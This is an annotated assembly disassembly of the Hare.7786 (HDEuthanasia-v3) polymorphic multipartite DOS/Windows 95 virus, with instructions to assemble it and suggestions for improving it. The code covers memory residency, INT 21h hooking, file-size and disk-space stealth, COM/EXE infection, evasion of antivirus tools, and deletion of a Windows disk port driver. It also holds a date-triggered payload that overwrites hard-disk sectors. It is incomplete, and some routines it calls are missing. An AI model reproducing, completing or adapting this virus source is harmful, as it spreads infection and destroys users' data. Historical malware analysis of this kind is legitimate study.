;============================================================================
;
; HDEuthanasia-v3 by Demon Emperor.
;
; Disassembly of the Hare.7786 virus.
;
; Source: 103k
;
; Disassembly was done by T-2000 / Invaders.
;
; April 1998 / May 1998.
;
; Very stupid written! MUCH double, triple code, unstructured programming,
; different variables used.
;
; Full stealth polymorphic multipartite virus.
;
;
;  I guess da source is 70% reconstructed, the rest is kinda hard to do,
;  So I don't think that I will complete it (I got better things tha do).
;  Also please don't blame me for the pretty lame disassembly, I released
;  it only Bcoz I haven't seen any other disasms of Hare. I U decide to
;  finish the rest of the disassembly, I would appreciate if U gave me a
;  copy.
;
;  Demon Emperor seems to have a great knowledge about Win95, he introduced
;  several interresting techniques. It's a shame though, that the virus
;  has a bunch of shortcomings, these are:
;
;       - It doesn't pad the polymorphic code (different filesizes).
;       - Shoddy programming: It could loose a lot of weight (bytes), if
;         the author has used flexible routines.
;
;
;  Some improvements:
;
;       - INT 16h: also hook INT 10h, and don't allow writes to the screen,
;         turn-off PC-speaker.
;
;
;
;     TARGETS: 1st harddisk & 1.44M diskettes.
;     PAYLOAD: Message & disktrashing.
;  ENCRYPTION: Slow polymorphic.
;      STATUS: In the wild.
;
;
;  Assemble with TASM 3.2 (or compatible).
;
;       TASM hare.asm /m
;
; *** = Bug report/remark (actually too many to write down).
;
;============================================================================


; The following equates show data references outside the range of the program.

DATA_24E        EQU     7C16H                   ;*
DATA_25E        EQU     7DBEH                   ;*
Virus_Size      EQU     (OFFSET Virus_End - OFFSET Virus_Begin)


                .MODEL  TINY    ; (hmmm... not really!).
                .STACK  1024
                .CODE

Virus_Begin:
START:

                MOV     SI, 0                   ; Delta offset.
                ORG     $-2
Padding         DW      0

		CLD
		STI

                MOV     CX, 0F2Ch               ; Decrypt second layer.
                MOV     DI, OFFSET Layer_2      ; (slightly polymorphic).
		ADD     DI, SI
Decrypt_2:
                ;NOT     WORD PTR CS:[DI]
                nop
                nop
Key_2:          nop

		INC     DI
		INC     DI
		LOOP    Decrypt_2
Layer_2:
		MOV     AX, 0FE23h              ; Residency-check.
		INT     21h

		CMP     AX, 0Dh                 ; Are we already resident?

		PUSH    SI
		PUSH    DS

		JNE     Decrypt_Layer_3

		JMP     Exec_Host

Decrypt_Layer_3:

                MOV     AL, 0
		ORG     $-1
Key_3           DB      0
		OR      AL, AL
		JZ      Make_Resident

		MOV     AH, AL
		ADD     AH, 01h
		MOV     CX, 0E65h
		MOV     DI, OFFSET NewInt01h
		ADD     DI, SI

LOCLOOP_6:
                XOR     CS:[DI], AX
		INC     DI
		INC     DI
                ADD     AL, 2
                ADD     AH, 2
		LOOP    LOCLOOP_6

Make_Resident:
		INT     12h                     ; Get total DOS-memory in AX.

		MOV     CL, 6
		SHL     AX, CL                  ; Convert to segment-address.

		DEC     AX
		MOV     ES, AX

		CMP     ES:[8], 'CS'            ; Systemcode?
		JE      Find_Last_MCB
LOC_8:
		MOV     AH, 52h                 ; Get list of lists.
		INT     21h

		MOV     AX, ES:[BX-2]           ; Get 1st MCB.

Find_Last_MCB:  MOV     ES, AX

		CMP     BYTE PTR ES:[0], 'Z'    ; Last block?
		JE      Last_MCB_Found

		MOV     AX, ES:[3]              ; Get total memory in MCB.
		INC     AX                      ; Plus size MCB (10h bytes).
		MOV     BX, ES
		ADD     AX, BX                  ; Current MCB + total mem.
		JMP     Find_Last_MCB

Last_MCB_Found:

		MOV     AX, ES:[3]              ; Get total memory in MCB.
		SUB     AX, (8912 / 16)         ; Subtract our needed mem.
		JC      LOC_8

		MOV     ES:[3], AX              ; Put it back.
		INC     AX                      ; Plus size MCB.
		MOV     BX, ES
		ADD     AX, BX
		MOV     ES, AX

		POP     DS                      ; DS:SI = Entrypoint virus.
		POP     SI

		PUSH    SI
		PUSH    DS

		PUSH    CS
		POP     DS

                MOV     CX, Virus_Size          ; Copy virus to virussegment.
		XOR     DI, DI
		CLD
		REP     MOVSB

		PUSH    ES                      ; JMP to relocated virus.
		MOV     AX, OFFSET Relocated
		PUSH    AX
		RETF

;
; 0 = No
; 1 = Yes
;
; Bits:
;       0
;       1  Disable stealth.
;       2  Windows 95/NT running.
;       3
;       4
;       5
;       6
;       7  Windows 95/NT running.
;

Relocated:
		MOV     CS:Flags, CL            ; Clear Flags variable.

		MOV     AX, 160Ah               ; Identify Windows version
		INT     2Fh                     ; and type.

		OR      AX, AX                  ; Function accepted?
		JNZ     Bad_Windows

		CMP     CX, 03h                 ; Enhanched version running?
		JB      Bad_Windows

		OR      BYTE PTR CS:Flags, 10000000b

Bad_Windows:    CALL    Check_Poly_Sector
		CALL    Infect_Harddisk

		PUSH    CS
		POP     DS

		MOV     AH, 52h                 ; List of lists.
		INT     21h

		MOV     AX, ES:[BX-2]           ; Get 1st MCB in AX.
		MOV     First_MCB, AX           ; Save it for the tracer.

		MOV     BYTE PTR Trace_Function, 19h ; Get free diskspace.
		MOV     BYTE PTR Fake_PUSHF, 00h
		MOV     byte ptr Trace_Done, 01h

		MOV     AX, 3521h               ; Get address INT 21h.
		INT     21h

                MOV     Int21h, BX              ; Save INT 21h.
		MOV     Int21h+2, ES

		MOV     Trace_Int, BX           ; Find entrypoint.
		MOV     Trace_Int+2, ES
		CALL    Tracer

		CLD                             ; Replace address INT 21h
		MOV     SI, OFFSET Trace_Int    ; with traced address.
		MOV     DI, OFFSET Traced_Int21h
		MOVSW
		MOVSW

		XOR     AX, AX                  ; Hook INT 21h.
		MOV     DS, AX

		MOV     DS:[21h * 4], OFFSET NewInt21h
		MOV     DS:[21h * 4 + 2], CS

		CALL    SUB_56
		CALL    Del_PortDriver

		POP     ES                      ; ES:DI = Virus entrypoint.
		POP     SI

		XOR     SI, SI

		PUSH    SI
		PUSH    ES

Exec_Host:
		POP     ES
		POP     SI

		PUSH    ES
		POP     DS

		PUSH    DS

		CMP     BYTE PTR CS:[SI+Host_Type], 01h
		JE      Exec_EXE

		ADD     SI, OFFSET Old_Entry
		MOV     DI, 100h
		PUSH    DI
		CLD

		PUSH    CS
		POP     DS

		MOVSW                           ; Restore original 3 bytes
                MOVSB                           ; in da .COM-file.

		PUSH    ES
		POP     DS
		CALL    Clear_Registers
		RETF

Exec_EXE:
		MOV     AX, CS:[SI+Old_Entry+2]
		POP     BX

		ADD     BX, 10h                 ; Plus size PSP.
                ADD     AX, BX                  ; Add effective segment.
                MOV     CS:[SI+JMP_Host+2], AX  ; Store it in the code.
		MOV     AX, CS:[SI+Old_Entry]

		MOV     CS:[SI+JMP_Host], AX
		ADD     CS:[SI+Old_Stack+2], BX

                CALL    Clear_Registers         ; Clear registers & flags.

		MOV     SS, CS:[SI+Old_Stack+2]
		MOV     SP, CS:[SI+Old_Stack]


		DB      0EAh                    ; JMP to host.
JMP_Host        DW      0, 0

Traced_Int21h   DW      0, 0
Int21h          DW      0, 0

JMP_COM         DB      90h                     ; JMP to virus in .COM-file.
		DW      0


Host_COM_JMP:

Old_Entry       DW      OFFSET Carrier, 0
Old_Stack       DW      0, 0
Old_Mod512      DW      30h
Old_Byte_Pages  DW      2
FileTime        DW      9AA0h
Host_Type       DB      01h
Temp1           DW      1E6Ah, 3
Trace_Int       DW      9AA0h, 2498h
First_MCB       DW      253h
Trace_Done      DB      0
Fake_PUSHF      DB      0
CodeSegment     DW      0
Int1Ch          DW      0, 0
Flags           DB      0
PSP_Segment     DW      0
Free_Clusters   DW      0
Trace_Function  DB      3


Clear_Registers:

		XOR     AX, AX

		PUSH    AX                      ; Clear all flags (also TF).
		POPF

		STI

		MOV     CX, AX                  ; Clear registers.
		MOV     DI, AX
		MOV     BP, AX
		MOV     DX, AX
		MOV     BX, AX

		RETN



NewInt01h:
		PUSH    AX
		PUSH    BX
		PUSH    BP
		PUSH    DS
		MOV     BP, SP

		MOV     AX, [BP+10]             ; AX = CS.
		MOV     BX, [BP+08]             ; BX = IP.

		MOV     CS:CodeSegment, CS

		CMP     AX, CS:CodeSegment
		JE      Exit_Int01h

		CALL    Check_Opcode

		CMP     AX, 0F000h
		JNB     LOC_14

		CMP     AX, CS:First_MCB        ; In DOS-segment?
		JA      Exit_Int01h             ; Continue tracing when not.
LOC_14:
		AND     CS:Trace_Done, 00000001b
		JZ      Exit_Int01h

		MOV     CS:Trace_Done, 00h
		MOV     CS:Trace_Int+2, AX      ; Store segment.
		MOV     AX, [BP+8]
		MOV     CS:Trace_Int, AX        ; Store offset.

Exit_Int01h:
		POP     DS
		POP     BP
		POP     BX
		POP     AX

                CMP     CS:Fake_PUSHF, 1
		JE      LOC_16

		IRET

LOC_16:
		MOV     CS:Fake_PUSHF, 0

		RETF


Tracer:
		MOV     AX, 3501h               ; Get INT 01h address.
		INT     21h

                MOV     Temp1, BX               ; Save INT 01h address.
		MOV     Temp1+2, ES
		MOV     DX, OFFSET NewInt01h

                MOV     AH, 25h                 ; Hook INT 01h.
		INT     21h

		XOR     DL, DL

		PUSHF
		POP     AX
		OR      AX, 100h                ; Turn TF on.
		PUSH    AX
		POPF

		MOV     AH, Trace_Function

		PUSHF                           ; Trace the function.
		CALL    DWORD PTR Trace_Int

		PUSHF
		POP     AX
		AND     AX, NOT 100h            ; Single-step mode off.
		PUSH    AX
		POPF

                LDS     DX, DWORD PTR Temp1     ; Restore INT 01h.
		MOV     AX, 2501h
		INT     21h

		PUSH    CS
		PUSH    CS
		POP     ES
		POP     DS

		RETN

Check_Opcode:
		PUSH    AX
		MOV     DS, AX
		MOV     AL, [BX]

		CMP     AL, 9Dh                 ; Next instruction POPF ?
		JNE     LOC_17

		OR      [BP+0CH], 100h          ; Set TF in flags on stack.
		JMP     LOC_18
		NOP
LOC_17:
		CMP     AL,9Ch                  ; PUSHF ?
		JNE     LOC_18

		INC     WORD PTR [BP+8]
		MOV     CS:Fake_PUSHF,1
LOC_18:
		POP     AX
		RETN


SUB_4:
		MOV     AH, 04h                 ; Get clock.
		INT     1Ah

		TEST    DH, 00001000b
                JZ      Luck_4_User

		CMP     DL, 22h                 ; Trigger-date?
		JE      Payload

Luck_4_User:
		RETN

PayLoad:
		MOV     AX, 03h                 ; Clear the screen.
		INT     10h

		MOV     SI, OFFSET Message      ; Display text.
		MOV     BH, 00h
		MOV     CX, 3Dh

Display_Char:   LODSB                           ; String [si] to al
		MOV     AH, 0Eh                 ; Display character.
		INT     10h

		LOOP    Display_Char

		MOV     DL, 80h
LOC_22:
		MOV     BH, DL
		XOR     DL, 01h

		MOV     AH, 08h                 ; Get disk drive parameters.
		INT     13h

		AND     CL, 00111111b           ; 0 - 63.
		MOV     AL, CL
		MOV     AH, 03h
		PUSH    AX
		MOV     DL, BH
                MOV     AH, 08h
                INT     13h                     ; Disk  dl=drive 0  ah=func 08h
						;  get drive parameters, bl=type
						;   cx=cylinders, dh=max heads
		AND     CL, 00111111b           ; 0 - 63.
		MOV     AL, CL
		MOV     AH, 03h
		MOV     DL, BH
		MOV     CX, 0101h
		PUSH    AX
		MOV     BP, SP
LOC_23:
		PUSH    DX
LOC_24:
		TEST    DL, 00000001b
		JNZ     LOC_25

		MOV     AX, [BP]
		JMP     LOC_26
LOC_25:
		MOV     AX,[BP+2]
LOC_26:
		INT     13h                     ; ??INT NON-STANDARD INTERRUPT
		XOR     DL, 01h

		DEC     DH
		JNZ     LOC_24

		POP     DX

		INC     CH
		JNZ     LOC_23

		ADD     CL, 40h
		JNC     LOC_23

		ADD     DL, 2
		ADD     SP, 4

		JMP     LOC_22

; Calls the original INT 21h.

Traced_i21h:
		PUSHF
		CALL    DWORD PTR CS:Traced_Int21h

		RETN

Stealth_DiskSpace:

		PUSH    BX
		PUSH    AX

		MOV     AH, 62h                 ; Get PSP-address.
		CALL    Traced_i21h

		POP     AX

		CMP     CS:PSP_Segment, BX
		JNE     LOC_28

		CMP     CS:Trace_Function, DL   ; Drive.
		JNE     LOC_28

		POP     BX
		POPF

		CALL    Traced_i21h
		MOV     BX, CS:Free_Clusters    ; Fake # of free clusters.

		RETF    2

LOC_28:
		MOV     CS:PSP_Segment, BX
		MOV     CS:Trace_Function, DL   ; Save drive.
		POP     BX
		POPF
                CALL    Traced_i21h             ; Execute function.

		MOV     CS:Free_Clusters, BX    ; Genuine # of free clusters.

		RETF    2

Stealth_Filesize:

		CALL    DWORD PTR CS:Int21h    ; Execute function.

		PUSHF
		PUSH    AX
		PUSH    BX
		PUSH    ES

		TEST    CS:Flags, 00000010b     ; Stealth-Mode off?
		JNZ     Exit_Size_Stealth       ; Then no file-stealth.

		OR      AL, AL                  ; No error occurred?
		JNZ     Exit_Size_Stealth       ; Else exit.

		MOV     AH, 2Fh                 ; Get DTA-address.
		CALL    Traced_i21h

                CMP     CS:Function_i21h, 40h   ; FCB/Dir ?
		JA      Dir_Stealth

                OR      WORD PTR ES:[BX+26h], 0
		JNZ     LOC_30

                CMP     ES:[BX+24h], 1E9Ch
		JB      Exit_Size_Stealth
LOC_30:
		MOV     AX, ES:[BX+1Eh]
		AND     AL, 00011111b           ; Erase all but seconds.

		CMP     AL, 00010001b           ; 34 seconds?
		JNE     Exit_Size_Stealth

		SUB     WORD PTR ES:[BX+24h], (Virus_Size + 70)
		SBB     WORD PTR ES:[BX+26h], 0

		JMP     Exit_Size_Stealth

Dir_Stealth:
                OR      WORD PTR ES:[BX+1Ch], 0
		JNZ     LOC_32

		CMP     ES:[BX+1Ah], 1E9Ch
		JB      Exit_Size_Stealth
LOC_32:
		MOV     AX,ES:[BX+16h]          ; Get time in AX.
		AND     AL, 00011111b

		CMP     AL, 00010001b           ; 34 seconds?
		JNE     Exit_Size_Stealth

		SUB     WORD PTR ES:[BX+1AH], (Virus_Size + 70)
		SBB     WORD PTR ES:[BX+1CH], 0

Exit_Size_Stealth:

		POP     ES
		POP     BX
		POP     AX
		POPF

		RETF    2


Size_Stealth:   MOV     CS:Function_i21h, AH    ; Save function #.
		JMP     Stealth_Filesize

Function_i21h   DB      4Eh

Residency_Check:
		MOV     AX, 0Dh                 ; Return our sign.
		POPF

		RETF    2

NewInt21h:
		PUSHF

		CMP     AX, 0FE23h              ; Residency-check.
		JE      Residency_Check

		CMP     AH, 36h                 ; Get free diskspace.
		JNE     Check_Next_3

		JMP     Stealth_DiskSpace
Check_Next_3:
		CMP     AH, 4Ch                 ; Program terminate.
                JE      Check_PSP_Infect

		CMP     AH, 31h                 ; Terminate & stay resident.
                JE      Check_PSP_Infect

		CMP     AH, 00h                 ; Terminate program.
                JE      Check_PSP_Infect

		CMP     AX, 4B00h               ; Program execute.
		JNE     Check_Next_4

		CALL    Infect_Exec
Check_Next_4:
		CMP     AH, 11h                 ; Findfirst (FCB).
		JE      Size_Stealth

		CMP     AH, 12h                 ; Findnext (FCB).
		JE      Size_Stealth

		CMP     AH, 4Eh                 ; Findfirst (handle).
		JE      Size_Stealth

		CMP     AH, 4Fh                 ; Findnext (handle).
		JE      Size_Stealth

		CMP     AH, 3Dh                 ; Open file (handle).
		JNE     Check_Next_5

		CALL    Clean_File

Check_Next_5:
		CMP     AH, 3Eh                 ; Close file (handle).
		JNE     LOC_39

		POPF
		CALL    Infect_Close

		RETF    2                       ; Return to caller.
LOC_39:
		POPF
		JMP     DWORD PTR CS:Int21h

Check_PSP_Infect:
		AND     CS:Flags, 00000100b

		PUSH    AX
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    DI
		PUSH    ES
		PUSH    DS

		MOV     AH, 62h                 ; Get PSP.
		CALL    Traced_i21h
		JC      Exit_PSP_Check

		CLD
		MOV     ES, BX
		MOV     ES, ES:[2Ch]
		XOR     DI, DI
		MOV     AL, 00h
LOC_41:
		MOV     CX, 0FFFFh
		REPNE   SCASB

		CMP     ES:[DI], AL
		JNE     LOC_41

		ADD     DI, 03h
		MOV     DX, DI

		PUSH    ES
		POP     DS

		MOV     AX, 3D00h               ; Open file...
		CALL    Traced_i21h
		JC      Exit_PSP_Check

		MOV     BX, AX                  ; And infect it on closing.
		CALL    Infect_Close

Exit_PSP_Check:

		POP     DS
		POP     ES
		POP     DI
		POP     DX
		POP     CX
		POP     BX
		POP     AX
		POPF

		JMP     DWORD PTR CS:Traced_Int21h


; AX = 4B00h

Infect_Exec:
		PUSH    AX                      ; Save registers.
		PUSH    BX
		PUSH    CX
		PUSH    DX
		PUSH    ES
		PUSH    DS
		PUSH    DI
		PUSH    SI

		CALL    Check_To_Del_Driver
		CALL    Set_Dummy_Handlers
		CALL    Save_FileAttr
		CALL    Check_FileName

		PUSHF
		PUSH    DS

		PUSH    CS
		POP     DS

                MOV     DI, 0
                ORG     $-2
Gaby1           DW      OFFSET FileName1
		MOV     SI, OFFSET FileName2

		ADD     BX, 04h
		MOV     CX, BX
		REP     MOVSB

		POP     DS
		POPF
                JC      Exit_Infect_Exec        ; Special file?

		MOV     AX, 3D02h               ; Open file r/w.
		CALL    Traced_i21h

		XCHG    BX, AX                  ; BX = Filehandle.
		CALL    Save_FileTime
                MOV     AX, CS:Trace_Int        ; Get filetime.
		AND     AL, 00011111b           ; Mask seconds.
		PUSH    AX

		MOV     AH, 3Fh                 ; Read header.
		MOV     CX, 28

		PUSH    CS
		POP     DS

		PUSH    DS
		POP     ES

                MOV     DX, OFFSET Buffer
		CALL    Traced_i21h

		MOV     SI, DX
		CLD
		LODSW                           ; Get 1st word from header.

		CMP     AX, 'ZM'                ; True .EXE-file?
		JE      Is_EXE

		CMP     AX, 'MZ'                ; True .EXE-file?
		JNE     Is_COM                  ; Else it's a .COM-file.

Is_EXE:
                POP     AX                      ; POP filetime.

		TEST    Flags, 00000100b
		JZ      LOC_44

		CMP     AL, 11h
		JE      LOC_47

		CALL    Infect_EXE
		JNC     LOC_46

		JMP     Exit_Infect_Exec
LOC_44:
		CMP     AL, 11h
		JNE     LOC_47

		CALL    SUB_41
		JNC     LOC_47

		JMP     Exit_Infect_Exec

Is_COM:
		POP     AX                      ; AX = Filetime.

		CMP     AL, 11h                 ; 34 seconds, infected?
		JE      Exit_Infect_Exec

		CALL    Infect_COM
		JC      LOC_47
LOC_46:
		MOV     AX, Trace_Int           ; Set infected timestamp.
		AND     AL, 11100000b
		OR      AL, 11h                 ; 34 seconds.
		MOV     Trace_Int, AX
LOC_47:
		CALL    Restore_FileTime

Exit_Infect_Exec:

		MOV     AH, 3Eh                 ; Close file.
		CALL    Traced_i21h

		CALL    Restore_FileAttr
		CALL    Restore_Dummy_Handlers

                POP     SI                      ; Restore registers.
		POP     DI
		POP     DS
		POP     ES
		POP     DX
		POP     CX
		POP     BX
		POP     AX

		RETN


; Checks if INT 13h part is resident, and deletes portdriver if so.

Check_To_Del_Driver:

		CALL    Del_PortDriver

		MOV     AX, 160Ah               ; Identify Windows version
		INT     2Fh                     ; and type.

		OR      AX, AX                  ; Legal function?
		JNZ     Exit_Del_PortDriver

		CMP     BH, 04h                 ; Windows ver. 4 or higher?
		JB      Exit_Del_PortDriver

		MOV     AX, 5445h               ; INT 13h residency-check.
		INT     13h

		CMP     AX, 4554h               ; INT 13h part installed?
		JNE     Exit_Del_PortDriver

		CALL    Del_PortDriver
		JC      LOC_49                  ; File not found?

		RETN
LOC_49:
		CALL    Unslice_Int13h

Exit_Del_PortDriver:

		RETN



Infect_EXE:
                CMP     Reloc_Offs, 40h         ; PE-header?
		JNE     LOC_52

		STC
LOC_51:
                JMP     Exit_Infect_EXE
LOC_52:
                MOV     DI, OFFSET Old_Entry    ; Save old CS:IP.
		MOV     SI, OFFSET Init_IP

		MOVSW
		MOVSW

                MOV     SI, OFFSET Init_SS      ; Save old SS:SP.
		MOV     DI, OFFSET Old_Stack+2
		MOVSW
		SUB     DI, 04h
		MOVSW

                MOV     SI, DX                  ; Buffer.
                MOV     Host_Type, 01h          ; Host is .EXE-file.

                CALL    Check_Infect            ; Suitable for infection?
                JC      LOC_51                  ; CF set if not.

                MOV     AX, Trace_Int           ; Save time.
                MOV     FileTime, AX

                MOV     AX, [SI+2]              ; Filesize MOD 512.
                MOV     Old_Mod512, AX

                MOV     AX, [SI+4]              ; File in 512-byte pages.
                MOV     Old_Byte_Pages, AX

                MOV     AX, [SI+4]              ;
                MOV     DX, 512

                CMP     WORD PTR [SI+2], 0      ; No rounding?
		JE      LOC_53

                DEC     AX                      ;
LOC_53:
                MUL     DX                      ; Calculate filesize.
		MOV     Temp1+2, DX
                MOV     DX, [SI+2]
                ADD     AX, DX                  ; Plus filesize MOD 512.
                ADC     Temp1+2, 00h
		MOV     Temp1, AX

		PUSH    AX

                XOR     CX, CX                  ; Go to end of file.
                MOV     DX, CX                  ; DX:AX = Filesize.
		MOV     AX, 4202h
		CALL    Traced_i21h

                SUB     AX, Temp1               ; Same size as in header?
                JZ      Good_Size_Lo            ; (ie. no internal overlay?).

                POP     AX
		STC

                JMP     Exit_Infect_EXE

Good_Size_Lo:
                SUB     DX, Temp1+2             ; Same size as in header?
                JZ      Good_Size_Hi

		POP     AX
		STC

                JMP     Exit_Infect_EXE

Good_Size_Hi:
                POP     AX                      ; Filesize low.
                MOV     CX, Temp1+2             ; Filesize high.
		MOV     DX, AX
                MOV     AX, 4200h               ; Go to end file.
		CALL    Traced_i21h

                MOV     AX, 1E7Bh
                MOV     DX, [SI+2]              ; Filesize MOD 512.
                ADD     DX, AX
LOC_56:
                INC     WORD PTR [SI+4]         ; Filesize in 512-byte pages.
                SUB     DX, 512

                CMP     DX, 512
		JA      LOC_56

                JNE     LOC_57
		XOR     DX, DX
LOC_57:
		MOV     [SI+2], DX

                MOV     AX, [SI+8]              ; Size header in paragraphs.
                MOV     CX, 16
                MUL     CX                      ; Calculate headersize bytes.

                MOV     CX, Temp1               ; Filesize minus headersize.
		SUB     CX, AX
		SBB     Temp1+2, DX

                MOV     DI, Temp1+2             ; Filesize high.
                MOV     SI, CX                  ; Filesize low.

		MOV     DX, DI
		MOV     AX, SI
                MOV     CX, 16
                DIV     CX                      ; Filesize DIV 16.

                MOV     DI, AX
		MOV     SI, DX

                MOV     Host_Entrypoint, SI
                MOV     Padding, SI             ; 0 - 15 bytes padding.

                ADD     SI, OFFSET Buffer       ; Plus end of virus.
		MOV     Temp1, SI
		MOV     Temp1+2, DI

                CLD                             ; Set host's new entrypoint.
		MOV     SI, OFFSET Temp1
		MOV     DI, OFFSET Init_IP

		MOVSW
		MOVSW

                CALL    Poly_Engine             ; Polymorphic encryptor.
                JC      Exit_Infect_EXE

		XOR     CX, CX                  ; Go to start of file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h

                CALL    Make_Random_Stack

		MOV     DX, OFFSET Buffer       ; Write updated header.
		MOV     AH, 40h
		MOV     CX, 28
		CALL    Traced_i21h

Exit_Infect_EXE:

		RETN



Infect_COM:
                MOV     Host_Type, 00h          ; Set host as .COM-file.
                CLD
                MOV     DI, OFFSET Host_COM_JMP
		MOV     SI, OFFSET Buffer
                CALL    Check_Infect            ; Suitable for infection?
		JC      LOC_59

                MOV     CX, 3                   ; Copy first 3 bytes of host
                REP     MOVSB                   ; to our storage-place.

                MOV     DX, CX                  ; Go to end of file.
                MOV     AX, 4202h               ; DX:AX = Filesize.
		CALL    Traced_i21h

                OR      DX, DX                  ; File under 64k?
		JZ      LOC_60
LOC_59:
		STC
                JMP     Exit_Infect_COM
LOC_60:
                CMP     AX, 30                  ; File too small?
		JB      LOC_59

                XOR     CX, CX                  ; Go to end of file.
                MOV     DX, CX                  ; DX:AX = Filesize.
		MOV     AX, 4202h
                CALL    Traced_i21h

                CMP     AX, 55701               ; File too big?
		JB      LOC_61

                STC                             ; Set carry-flag (error).
                JMP     Exit_Infect_COM

LOC_61:
                MOV     Host_Entrypoint, AX
                ADD     Host_Entrypoint, 100h
                MOV     Padding, AX             ; Virus entrypoint.
                ADD     Padding, 100h           ; Plus .COM-entrypoint.

		MOV     DI, OFFSET JMP_COM
                MOV     BYTE PTR [DI], 0E9h     ; JMP opcode.
                SUB     AX, 3                   ; Minus displacement.
                ADD     AX, Virus_Size          ; Plus entrypoint.
                MOV     [DI+1], AX              ; Store it.

                CALL    Poly_Engine             ; Append polymorphic copy.
                JC      Exit_Infect_COM

                XOR     CX, CX                  ; Go to start file.
		MOV     DX, CX
		MOV     AX, 4200h
		CALL    Traced_i21h

                MOV     CX, 3                   ; Write JMP Virus to start
		MOV     DX, OFFSET JMP_COM      ; of .COM-file.
		MOV     AH, 40h
		CALL    Traced_i21h

Exit_Infect_COM:

		RETN


Save_FileTime:
                MOV     AX, 5700h               ; Get filetime.
		CALL    Traced_i21h
		MOV     CS:Trace_Int, CX
		MOV     CS:Trace_Int+2, DX

		RETN


; Guess what...!?
Restore_FileTime:

                MOV     AX, 5701h               ; Set timestamp.
                MOV     CX, CS:Trace_Int
                MOV     DX, CS:Trace_Int+2
		CALL    Traced_i21h

		RETN



;
; Saves file attributes, and clears them afterwards.
;  In: BX = Filehandle.
;
Save_FileAttr:
		MOV     AX, 4300h               ; Get file-attributes.
		CALL    Traced_i21h

		MOV     CS:CodeSegment, CX
		MOV     AX, 4301h               ; Clear file-attributes.
		XOR     CX, CX
		CALL    Traced_i21h

		RETN


Restore_FileAttr:

		MOV     AX, 4301h               ; Set file-attributes.
		MOV     CX, CS:CodeSegment
		CALL    Traced_i21h

		RETN

SUB_14:
		PUSH    DS

		PUSH    CS
		POP     DS

		CLD
		MOV     SI, OFFSET FileName2
		SUB     BX, 4
		JC      LOC_63

		MOV     AX, [SI]

		CMP     AX, 'BT'                ; TBAV utilities?
		STC
		JE      LOC_63

		CMP     AX, '-F'                ; F-Prot?
		JE      LOC_65

		CMP     AX, 'VI'                ; Invircible?
		JE      LOC_65

		CMP     AX, 'HC'                ; CHKDSK.EXE ?
		JE      LOC_64

                MOV     AL, 'V'                 ; Filename contains a 'V' ?
		MOV     DI,OFFSET FileName2
                MOV     CX, BX
		INC     CX
                REPNE   SCASB

                OR      CX, CX                  ; Found?
		STC
                JNZ     LOC_63                  ; Then exit with carry set.

                MOV     DI, OFFSET FileName2    ; Filename is COMMAND.* ?
		MOV     SI, OFFSET Command_Com
		MOV     CX, BX
		REPE    CMPSB

                OR      CX, CX                  ; Found?
		STC
                JZ      LOC_63                  ; Then exit with carry set.
		CLC
LOC_63:
		POP     DS
                RETN
LOC_64:
                OR      Flags, 00000010b
		POP     DS
		RETN
LOC_65:
                OR      Flags, 00000001b
		STC
		POP     DS

		RETN



Check_FileName:
		PUSH    DS
		POP     ES

		XOR     AL, AL
		MOV     DI, DX
		XOR     CX, CX
		MOV     CL, 0FFh
		MOV     BX, CX
		CLD
		REPNE   SCASB                   ; Find end of ASCIIZ-string.

		DEC     DI
		DEC     DI
		SUB     BX, CX
		MOV     CX, BX
		STD
		MOV     AL, '\'
		REPNE   SCASB                   ; Find start filename.

		SUB     BX, CX
		MOV     CX, BX
		INC     DI
		MOV     AL,ES:[DI]

		CMP     AL, '\'
		JNE     LOC_66

		INC     DI
		MOV     SI, DI
		MOV     DI, OFFSET FileName2
		DEC     CX
		DEC     BX
		CLD

		PUSH    CS
		POP     ES

		REP     MOVSB
		CALL    SUB_14

		RETN
LOC_66:
		MOV     BX, 0Ah

		PUSH    CS
		POP     ES

		RETN

FileName1       DB      'DUM1.EXE.EXE', 0
FileName2       DB      'DUM1.EXECOME', 0
Command_Com     DB      'COMMAND'
Port_Driver     DB      '\SYSTEM\IOSUBSYS\HSFLOP.PDR', 0



; Searches the program environment to find a 'WIN'-string. This matches
; normally to either WINBOOTDIR or WINDOWS, thus the Windows directory.
; It then appends the path '\SYSTEM\IOSUBSYS\HDFLOP.PDR' to the found
; directoryname. The file HSFLOP.PDR handles the port-level-access to disks,
; without it Windows needs to use the slow INT 13h (which the virus has
; hooked). Hare does this to also infect bootsectors under Windows 95/NT.

Del_PortDriver:

		PUSH    DS
		PUSH    DX

		XOR     DI, DI

Find_String:
		MOV     CX, 0FFFFh

		MOV     AH, 62h                 ; Get PSP.
		INT     21h

		MOV     ES, BX
		MOV     ES, ES:[2Ch]            ; ES = Program's environment-
		CLD                             ; block (PATH, SET, etc).

Get_Next_String:

		MOV     AL, 0
		REPNE   SCASB                   ; Find end of ASCIIZ-string.
		MOV     AX, ES:[DI]             ; Get first word.

		OR      AL, AL                  ; No settings?
		JZ      Exit_Del_Driver         ; Then exit routine.

		AND     AX, 1101111111011111b   ; Convert to uppercase.

		CMP     AX, 'IW'                ; WINBOOTDIR/WINDOWS?
		JNE     Get_Next_String

		MOV     AL, ES:[DI+2]           ; Get third character.
		AND     AL, 11011111b           ; To uppercase.

                CMP     AL, 'N'                 ; Have we found WIN ?
		JNE     Get_Next_String

                MOV     AL, '='                 ; Value.

		REPNE   SCASB                   ; Find '='.
		JCXZ    Exit_Del_Driver         ; Not found?

		MOV     SI, DI
		MOV     BX, DI
		MOV     DI, OFFSET Buffer
		MOV     DX, DI

		PUSH    ES
		POP     DS

		PUSH    CS
		POP     ES


		; This copies the string found above to our buffer.
Copy_Byte:
		LODSB                           ; Copy byte to our buffer.
		STOSB

		OR      AL, AL                  ; End reached?
		JNZ     Copy_Byte               ; No, then continue copy.

		DEC     DI

		PUSH    CS
		POP     DS

		MOV     SI, OFFSET Port_Driver  ; Append path to Windows-dir.
		MOV     CX, 28
		REP     MOVSB

		MOV     AH, 41h                 ; Delete portdriver.
		CALL    Traced_i21h
		JNC     Exit_Del_Driver

		CMP     AL, 02h                 ; File not found?
						; (Wrong string fetched?)
		MOV     DI, BX
		JZ      Find_String

		STC
Exit_Del_Driver:

		POP     DX
		POP     DS

		RETN

DATA_70         DB      0
		DB      1Ah, 02h        ; Read real-time clock.
		DB      1Ah, 04h        ; Read date from real-time clock.
		DB      1Ah, 03h        ; Set real-time clock.
		DB      10h, 08h        ; Read character and attribute.
		DB      10h, 0Fh        ; Get current display mode.
		DB      10h, 0Bh        ; Set color palette.
		DB      21h, 0Dh        ; Reset disk.
